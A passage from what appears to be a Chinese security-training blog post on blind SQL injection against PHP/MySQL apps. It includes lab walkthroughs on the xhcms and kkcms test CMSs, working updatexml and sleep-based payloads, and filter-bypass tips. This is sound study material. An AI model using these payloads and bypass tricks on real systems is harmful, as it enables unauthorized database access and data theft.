+</tbody></table>
+<h2 id="5-PHP-MySQL-注入条件与判断"><a href="#5-PHP-MySQL-注入条件与判断" class="headerlink" title="5. PHP-MySQL 注入条件与判断"></a>5. PHP-MySQL 注入条件与判断</h2><h3 id="5-1-核心判断标准（补充原理）"><a href="#5-1-核心判断标准（补充原理）" class="headerlink" title="5.1 核心判断标准（补充原理）"></a>5.1 核心判断标准（补充原理）</h3><table>
+<thead>
+<tr>
+<th>注入条件类型</th>
+<th>判断方法</th>
+<th>原理</th>
+<th>示例场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>基于布尔</td>
+<td>构造and 1&#x3D;1（正常）和and 1&#x3D;2（异常）</td>
+<td>逻辑条件影响 SQL 查询结果，进而影响页面显示</td>
+<td>新闻详情页：正确 ID 显示内容，错误 ID 显示空白</td>
+</tr>
+<tr>
+<td>基于时间</td>
+<td>构造and sleep(3)，观察页面加载时间</td>
+<td>条件成立时触发延迟，影响响应时间</td>
+<td>登录页：无论用户名密码对错，页面显示一致</td>
+</tr>
+<tr>
+<td>基于报错</td>
+<td>构造非法 SQL（如id&#x3D;1’），观察是否显示错误</td>
+<td>PHP 未关闭错误显示，SQL 语法错误对外暴露</td>
+<td>测试环境页面：直接显示 “MySQL server version for the right syntax to use near ‘’1’’’ at line 1”</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-黑盒测试优先选择（面试题解答优化）"><a href="#5-2-黑盒测试优先选择（面试题解答优化）" class="headerlink" title="5.2 黑盒测试优先选择（面试题解答优化）"></a>5.2 黑盒测试优先选择（面试题解答优化）</h3><p><strong>问题</strong>：黑盒测试时，若需盲注，优先选哪种方式？</p>
+<p><strong>解答</strong>：</p>
+<p><strong>优先尝试报错盲注</strong>：</p>
+<ul>
+<li><ul>
+<li>原因：构造简单（如加单引号），若开启错误显示，可快速获取数据，效率最高；</li>
+</ul>
+</li>
+<li><ul>
+<li>操作：先输入id&#x3D;1’或id&#x3D;1 and 1&#x3D;@@version，观察是否有错误回显。</li>
+</ul>
+</li>
+</ul>
+<p><strong>其次尝试布尔盲注</strong>：</p>
+<ul>
+<li><ul>
+<li>若无错误显示，构造and 1&#x3D;1和and 1&#x3D;2，观察页面是否有差异（如内容显示 &#x2F; 隐藏、按钮状态变化）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>最后尝试时间盲注</strong>：</p>
+<ul>
+<li><ul>
+<li>若页面无任何差异，用and sleep(3)测试延迟，缺点是效率低且受网络影响大。</li>
+</ul>
+</li>
+</ul>
+<p><strong>关键注意事项</strong>：需注意符号过滤（如单引号被转义，需用1’’或1’)尝试），以及空格过滤（用%20或&#x2F;**&#x2F;替换空格）。</p>
+<h2 id="6-实战-CMS-案例解析（步骤优化-补充说明）"><a href="#6-实战-CMS-案例解析（步骤优化-补充说明）" class="headerlink" title="6. 实战 CMS 案例解析（步骤优化 + 补充说明）"></a>6. 实战 CMS 案例解析（步骤优化 + 补充说明）</h2><h3 id="6-1-案例-1：xhcms-插入报错注入（Insert-操作注入）"><a href="#6-1-案例-1：xhcms-插入报错注入（Insert-操作注入）" class="headerlink" title="6.1 案例 1：xhcms - 插入报错注入（Insert 操作注入）"></a>6.1 案例 1：xhcms - 插入报错注入（Insert 操作注入）</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>通过 “留言提交” 功能（Insert 操作），利用报错盲注获取数据库版本。</p>
+<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ul>
+<li><p>靶场：xhcms（PHP+MySQL）</p>
+</li>
+<li><p>功能点：留言板（<a target="_blank" rel="noopener" href="http://192.168.137.1:85/?r=contact%EF%BC%89">http://192.168.137.1:85/?r=contact）</a></p>
+</li>
+<li><p>核心风险：留言内容未过滤，直接拼接进 Insert 语句。</p>
+</li>
+</ul>
+<h4 id="详细步骤（补充关键解释）"><a href="#详细步骤（补充关键解释）" class="headerlink" title="详细步骤（补充关键解释）"></a>详细步骤（补充关键解释）</h4><p><strong>定位注入点</strong>：</p>
+<ul>
+<li><ul>
+<li>查看源码：全局搜索insert，找到files&#x2F;submit.php的 Insert 语句：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO interaction (name, content, ...) VALUES (&#x27;$name&#x27;, &#x27;$content&#x27;, ...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><ul>
+<li>发现$content（留言内容）未过滤，且用单引号包裹→注入需闭合单引号。</li>
+</ul>
+</li>
+</ul>
+<p><strong>构造注入语句</strong>：</p>
+<ul>
+<li><ul>
+<li>留言内容输入：’ and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) and ‘</li>
+</ul>
+</li>
+<li><ul>
+<li>关键：末尾的and ‘用于闭合 SQL 语句的最后一个单引号（原语句最后是’$content’，注入后变为’内容’ and … and ‘’，语法正确）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>触发报错</strong>：</p>
+<ul>
+<li><ul>
+<li>注意：留言内容必须含中文（原理：xhcms 对纯英文内容有编码处理，导致报错不回显；中文可绕过编码，正常触发错误）。</li>
+</ul>
+</li>
+<li><ul>
+<li>提交后，页面显示报错：XPATH syntax error: ‘<del>5.7.26</del>‘→获取到数据库版本。</li>
+</ul>
+</li>
+</ul>
+<h4 id="案例总结"><a href="#案例总结" class="headerlink" title="案例总结"></a>案例总结</h4><ul>
+<li><p>Insert 注入常出现在 “留言板、注册、评论” 等功能；</p>
+</li>
+<li><p>需注意闭合 SQL 语句中的单引号 &#x2F; 双引号，避免语法错误；</p>
+</li>
+<li><p>部分 CMS 对英文内容特殊处理，可尝试中文 &#x2F; 特殊字符触发报错。</p>
+</li>
+</ul>
+<h3 id="6-2-案例-2：kkcms-删除延时注入（Delete-操作注入）"><a href="#6-2-案例-2：kkcms-删除延时注入（Delete-操作注入）" class="headerlink" title="6.2 案例 2：kkcms - 删除延时注入（Delete 操作注入）"></a>6.2 案例 2：kkcms - 删除延时注入（Delete 操作注入）</h3><h4 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h4><p>通过 “用户组删除” 功能（Delete 操作），利用时间盲注猜解数据库名第一个字符。</p>
+<h4 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h4><ul>
+<li><p>靶场：kkcms（PHP+MySQL）</p>
+</li>
+<li><p>功能点：管理员后台用户组删除（<a target="_blank" rel="noopener" href="http://192.168.137.1:86/admin/cms_usergroup.php%EF%BC%89">http://192.168.137.1:86/admin/cms_usergroup.php）</a></p>
+</li>
+<li><p>核心风险：删除参数del未过滤，直接拼接进 Delete 语句。</p>
+</li>
+</ul>
+<h4 id="详细步骤（补充工具使用说明）"><a href="#详细步骤（补充工具使用说明）" class="headerlink" title="详细步骤（补充工具使用说明）"></a>详细步骤（补充工具使用说明）</h4><p><strong>定位注入点</strong>：</p>
+<ul>
+<li><ul>
+<li>查看源码：全局搜索delete，找到admin&#x2F;model&#x2F;usergroup.php的 Delete 语句：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM usergroup WHERE id=$del</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><ul>
+<li>$del是 URL 参数（?del&#x3D;4），未过滤→可构造时间盲注语句。</li>
+</ul>
+</li>
+</ul>
+<p><strong>使用 Burp Suite 抓包测试</strong>：</p>
+<ul>
+<li><ul>
+<li>原因：浏览器无法直观显示延迟时间，Burp 的 “Repeater” 模块可查看响应时间。</li>
+</ul>
+</li>
+<li><ul>
+<li>抓包：访问删除按钮，抓取 GET 请求<a target="_blank" rel="noopener" href="http://xxx/admin/cms_usergroup.php?del=4%E3%80%82">http://xxx/admin/cms_usergroup.php?del=4。</a></li>
+</ul>
+</li>
+</ul>
+<p><strong>构造延时注入语句</strong>：</p>
+<ul>
+<li><ul>
+<li>原始参数：?del&#x3D;4</li>
+</ul>
+</li>
+<li><ul>
+<li>注入语句：?del&#x3D;4%20or%20if(ord(left(database(),1))&#x3D;107,sleep(2),0)</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>%20：替换空格（避免 URL 解析错误）；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>ord(left(database(),1))&#x3D;107：判断数据库名第 1 个字符的 ASCII 码是否为 107（对应字符 ‘k’）；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>若条件成立，延迟 2 秒；不成立则无延迟。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>判断结果</strong>：</p>
+<ul>
+<li><ul>
+<li>在 Burp Repeater 中发送请求，观察 “Response Time”：</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>若响应时间≈2 秒→条件成立（数据库名第 1 个字符是 ‘k’）；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>若响应时间≈0.1 秒→条件不成立，调整 ASCII 码值继续测试。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h4><ul>
+<li><p>Delete 注入常出现在 “后台删除数据” 功能（需登录权限）；</p>
+</li>
+<li><p>单引号被过滤时，用ord()转 ASCII 码比较（无需单引号包裹字符）；</p>
+</li>
+<li><p>空格被过滤时，可用%20（URL 编码）、&#x2F;**&#x2F;（SQL 注释）替换。</p>
+</li>
+</ul>
+<h2 id="7-xhcms-kkcms-搭建补充（新手友好版）"><a href="#7-xhcms-kkcms-搭建补充（新手友好版）" class="headerlink" title="7. xhcms&#x2F;kkcms 搭建补充（新手友好版）"></a>7. xhcms&#x2F;kkcms 搭建补充（新手友好版）</h2><h3 id="7-1-xhcms-搭建步骤"><a href="#7-1-xhcms-搭建步骤" class="headerlink" title="7.1 xhcms 搭建步骤"></a>7.1 xhcms 搭建步骤</h3><p><strong>下载源码</strong>：从官方或安全靶场平台获取 xhcms 源码。</p>
+<p><strong>配置数据库</strong>：</p>
+<ul>
+<li><ul>
+<li>新建 MySQL 数据库（如xhcms_db）；</li>
+</ul>
+</li>
+<li><ul>
+<li>导入源码中的 SQL 文件（如xhcms.sql）；</li>
+</ul>
+</li>
+<li><ul>
+<li>修改config.php中的数据库配置：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dbhost = &#x27;localhost&#x27;; // 数据库地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;      // 用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;    // 密码</span><br><span class="line">$dbname = &#x27;xhcms_db&#x27;;  // 数据库名</span><br></pre></td></tr></table></figure>
+
+<p><strong>部署到 PHP 环境</strong>：</p>
+<ul>
+<li><ul>
+<li>将源码放入 PHPStudy 的www目录（或 XAMPP 的htdocs目录）；</li>
+</ul>
+</li>
+<li><ul>
+<li>访问<a target="_blank" rel="noopener" href="http://localhost/xhcms/%EF%BC%8C%E8%8B%A5%E6%98%BE%E7%A4%BA%E9%A6%96%E9%A1%B5%E2%86%92%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E3%80%82">http://localhost/xhcms/，若显示首页→搭建成功。</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="7-2-kkcms-搭建步骤"><a href="#7-2-kkcms-搭建步骤" class="headerlink" title="7.2 kkcms 搭建步骤"></a>7.2 kkcms 搭建步骤</h3><p><strong>下载源码</strong>：获取 kkcms 管理员版源码（含后台功能）。</p>
+<p><strong>配置数据库</strong>：</p>
+<ul>
+<li><ul>
+<li>新建数据库kkcms_db，导入kkcms.sql；</li>
+</ul>
+</li>
+<li><ul>
+<li>修改inc&#x2F;config.php中的数据库信息。</li>
+</ul>
+</li>
+</ul>
+<p><strong>登录后台</strong>：</p>
+<ul>
+<li><ul>
+<li>访问<a target="_blank" rel="noopener" href="http://localhost/kkcms/admin/%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9Aadmin/admin123%EF%BC%9B">http://localhost/kkcms/admin/，默认账号密码：admin/admin123；</a></li>
+</ul>
+</li>
+<li><ul>
+<li>进入 “用户组管理”（cms_usergroup.php）→ 功能正常则搭建成功。</li>
+</ul>
+</li>
+</ul>
+<h2 id="8-常见问题与优化建议"><a href="#8-常见问题与优化建议" class="headerlink" title="8. 常见问题与优化建议"></a>8. 常见问题与优化建议</h2><h3 id="8-1-注入时遇到的问题及解决方案"><a href="#8-1-注入时遇到的问题及解决方案" class="headerlink" title="8.1 注入时遇到的问题及解决方案"></a>8.1 注入时遇到的问题及解决方案</h3><table>
+<thead>
+<tr>
+<th>问题现象</th>
+<th>原因</th>
+<th>解决方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单引号输入后变成&#39;</td>
+<td>PHP 开启了magic_quotes_gpc&#x3D;On（自动转义单引号）</td>
+<td>1. 用双引号尝试：” and 1&#x3D;1 – ；2. 用1’’闭合（转义后变成1&#39;&#39;，等效于1’’）</td>
+</tr>
+<tr>
+<td>空格输入后被过滤</td>
+<td>CMS 对空格进行了过滤</td>
+<td>用%20（URL 编码）、&#x2F;<strong>&#x2F;（SQL 注释）、+（部分场景）替换空格，如and&#x2F;</strong>&#x2F;1&#x3D;1</td>
+</tr>
+<tr>
+<td>报错盲注无回显</td>
+<td>PHP 关闭了display_errors</td>
+<td>改用布尔盲注或时间盲注；或尝试触发其他错误（如路径遍历）</td>
+</tr>
+<tr>
+<td>时间盲注延迟不稳定</td>
+<td>网络波动或服务器负载高</td>
+<td>增加延迟时间（如从 3 秒改为 5 秒），多次测试取平均值</td>
+</tr>
+</tbody></table>
+<p>- </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0xMouise.github.io">0xMouise</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0xmouise.github.io/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;SQL%E7%9B%B2%E6%B3%A8&amp;%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&amp;%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&amp;%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&amp;%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/">https://0xmouise.github.io/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;SQL%E7%9B%B2%E6%B3%A8&amp;%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&amp;%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&amp;%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&amp;%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0xMouise.github.io" target="_blank">0xMouise</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div><div class="post-share"><div class="social-share" data-image="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/16/042-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;MYSQL%E6%9E%B6%E6%9E%84&amp;SQL%E6%B3%A8%E5%85%A5&amp;%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2&amp;%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99&amp;%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C/" title="042-WEB攻防-PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15fyobj31hc0xc7wh.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">042-WEB攻防-PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作</div></div><div class="info-2"><div class="info-item-1">042-WEB 攻防：PHP 应用 &amp; MYSQL 架构 &amp; SQL 注入 &amp; 跨库查询 &amp; 文件读写 &amp; 权限操作二、核心知识点与演示案例1. 核心知识点 PHP-MYSQL-SQL 注入 - 常规查询  PHP-MYSQL-SQL 注入 - 跨库查询  PHP-MYSQL-SQL 注入 - 文件读写   2. 演示案例 PHP-MYSQL-Web 组成架构解析  PHP-MYSQL-SQL 常规查询实战  PHP-MYSQL-SQL 跨库查询实战  PHP-MYSQL-SQL 文件读写实战   三、PHP-MYSQL-Web 组成架构1. 架构核心逻辑服务器部署 MySQL 数据库，集中管理多个 Web 站点的数据库；站点与数据库的关联通过 “数据库用户” 实现，核心差异在于 “用户权限分配策略”，两种主流方案如下： 2. 两种数据库管理方案对比   管理方案 实现逻辑 优缺点分析    1. 统一 root 用户管理 所有站点（如www.zblog.com、www.demo01.com）均使用 MySQL 的 root 用户连接数据库...</div></div></div></a><a class="pagination-related" href="/2025/09/16/026-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-smarty%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8&amp;%E6%BA%90%E4%BB%A3%E7%A0%81%E7%AD%89/" title="026-安全开发-smarty模版引用&amp;源代码等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">026-安全开发-smarty模版引用&源代码等</div></div><div class="info-2"><div class="info-item-1">026-安全开发-smarty模版引用&amp;源代码等 #知识点： 1、PHP新闻显示-数据库操作读取显示2、PHP模版引用-自写模版&amp;Smarty渲染3、PHP模版安全-RCE代码执行&amp;三方漏洞  演示案例：一.新闻列表&amp;模版引用-代码RCE安全 1、数据库创建新闻存储2、代码连接数据库读取3、页面进行自定义显示  简单实现新闻列表显示   12345678910111213&lt;?phpinclude &quot;config.php&quot;;$id =$_GET[&#x27;id&#x27;] ?? &#x27;1&#x27;;$sql = &quot;select * from news where id=$id &quot;;$data = mysqli_query($conn,$sql);while($row=mysqli_fetch_row($data))&#123;    echo &quot;&lt;tile&gt;&quot;.$row[&#x27;1&#x27;].&quot;&lt;/title&gt;&lt;br&gt;&...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/16/015-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&WAF&%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等</div></div><div class="info-2"><div class="info-item-1">015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等 本节内容  1、端口扫描-应用&amp;协议2、WAF识别-分类&amp;识别3、蜜罐识别-分类&amp;识别解决：1、Web服务器&amp;应用服务器差异性2、WAF防火墙&amp;安全防护&amp;识别技术3、蜜罐平台&amp;安全防护&amp;识别技术  一.端口扫描-应用&amp;协议 Nmap：配置中：Quick scan plus是快速扫描，intense scan all TCP ports 是全部端口扫描    端口扫描的意义：通过扫描端口是否开放来确定主机上面安装过什么应用，网站应用数据库应用 等…. 在进行端口扫描的时候应该考虑 ：1.防火墙 2.内网环境 防火墙：对端口进行过滤 但不代表端口没有开启 只是没有对外服务 内网环境可能出现的情况：明明数据库端口是开的,网站也能正常打开 但是你对目标进行端口扫描 发现数据库端口没有开放（排除防火墙问题） 二.WAF防火墙&amp;安全防护&amp;识别技术1、WAF解释：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Applic...</div></div></div></a><a class="pagination-related" href="/2025/09/16/014-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84&%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB&%E6%B3%84%E6%BC%8F%E6%8F%90%E5%8F%96&API%E6%8E%A5%E5%8F%A3%E6%9E%9A%E4%B8%BE&FUZZ%E7%88%AC%E8%99%AB&%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/" title="014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</div></div><div class="info-2"><div class="info-item-1">第14天：信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目一.本节知识点1、JS前端架构-识别&amp;分析2、JS前端架构-开发框架分析3、JS前端架构-打包器分析4、JS前端架构-提取&amp;FUZZ解决：1、如何从表现中的JS提取价值信息2、如何从地址中FUZZ提取未知的JS文件3、如何从JS开放框架WebPack进行测试 1.什么是cms CMS（意思为“网站内容管理系统”， 用来管理网站后台，编辑网站前台。）Discuz、WordPress、Ecshop、蝉知等前端技术；HTML5、jquery、bootstrap、Vue等开发语言；PHP、JAVA、Ruby、Python、C#，JS等Web服务器；Apache、Nginx、IIS、lighttpd，Apache等应用服务器：；Tomcat、Jboss、Weblogic、Websphere等数据库类型：；Mysql、SqlServer、Oracle、Redis、MongoDB等操作系统信息；Linux、windows等应用服务信息：；FTP、SSH...</div></div></div></a><a class="pagination-related" href="/2025/09/16/017-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6&CMS%E5%B7%A5%E5%85%B7&%E5%85%B6%E4%BB%96%E7%AD%89/" title="017-信息打点-框架组件&amp;CMS工具&amp;其他等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxg1fj31hc0xc4qp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">017-信息打点-框架组件&amp;CMS工具&amp;其他等</div></div><div class="info-2"><div class="info-item-1">017-信息打点-框架组件&amp;CMS工具&amp;其他等 本节课主要知识点 1.CMS识别到后期漏洞利用和代码审计2.开发框架识别到后期漏洞利用和代码审计3.开发组件识别到后期漏洞利用和代码审计 一、CMS指纹识别-不出网程序识别1.概念CMS指纹识别一般能识别到的都是以PHP语言开发的网页为主，其他语言开发的网页识别难度大 识别的意义就是向着对应目标使用对应的工具进行攻击 1.后端：CMS：一般PHP开发居多源码程序（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计） 2.前端：JS框架（爬取更多的JS从里面筛选URL或敏感泄漏KEY等）  也是可以通过对JS代码逻辑进行代码审计 3.组件： 组件：第三方的功能模块（日志记录，数据监控，数据转换等）  java居多，常见有过安全漏洞组件（shiro solr log4j sprintboot等） 4.框架： 框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可 如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可 影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制  p...</div></div></div></a><a class="pagination-related" href="/2025/09/16/018-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7&%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83&%E5%BA%94%E7%94%A8%E7%9B%91%E6%8E%A7&%E9%9D%99%E6%80%81%E6%8F%90%E5%8F%96&%E5%8A%A8%E6%80%81%E6%8A%93%E5%8C%85&%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5ff9rzvnvj31hc0xc1ky.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试</div></div><div class="info-2"><div class="info-item-1">第18天：信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试 本节内容 1、Web&amp;备案信息&amp;单位名称中发现APP2、APP资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标APP信息2、如何从APP信息中提取资产  一、如何获取到目标APP信息1.名称获取app信息(爱企查、小蓝本、七麦、点点)1.爱企查知识产权https://aiqicha.baidu.com/  2.七麦、点点查名称[七麦  点点查 2、URL网站备案查APP关于我们 (psbc-ubank.com)（中邮邮惠万家）  1、查备案信息在搜 2、网站上有APP下载 3、市场直接搜单位名称   二、如何从app中收集资产通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。   资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试 泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等） 代码信息-java代码安全问题- 逆向相关   1、抓包-动态表现优...</div></div></div></a><a class="pagination-related" href="/2025/09/16/016-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87&%E8%B5%84%E6%BA%90URL&%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等</div></div><div class="info-2"><div class="info-item-1">016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等 一.相关链接&amp;工具站&amp;项目工具超级Ping：http://www.17ce.com/ 超级Ping：https://ping.chinaz.com/ 接口查询：https://get-site-ip.com/ 接口查询：https://fofa.info/extensions/source 国外请求：https://tools.ipip.net/cdn.php 国外请求：https://boce.aliyun.com/detect/ IP社区库：https://www.cz88.net/geo-public 全网扫描：https://github.com/Tai7sy/fuckcdn 全网扫描：https://github.com/boy-hack/w8fuckcdn 全网扫描：https://github.com/Pluto-123/Bypass_cdn 大佬文章-CDN绕过 https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ 二.CND前置知识...</div></div></div></a><a class="pagination-related" href="/2025/09/16/019-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%89%8B&%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7&%E4%BE%9D%E8%B5%96%E7%AD%89/" title="019-信息打点-小程序组手&amp;开发工具&amp;依赖等"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div 